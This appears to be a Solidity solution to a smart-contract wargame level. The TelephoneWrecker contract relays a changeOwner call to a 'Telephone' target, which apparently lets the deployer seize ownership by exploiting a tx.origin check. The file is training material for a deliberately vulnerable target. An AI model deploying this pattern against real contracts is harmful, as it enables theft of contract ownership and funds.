// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { ITelephone } from "../interfaces/ITelephone.sol";

contract TelephoneWrecker {
  address immutable public owner;
  ITelephone immutable public telephone;

  constructor(address _telephone) {
    owner = msg.sender;
    telephone = ITelephone(_telephone);
  }

  modifier onlyOwner() {
    require(msg.sender == owner, "ERR_NOT_OWNER");
    _;
  }

  function wreckIt() onlyOwner public {
    telephone.changeOwner(msg.sender);
  }
}
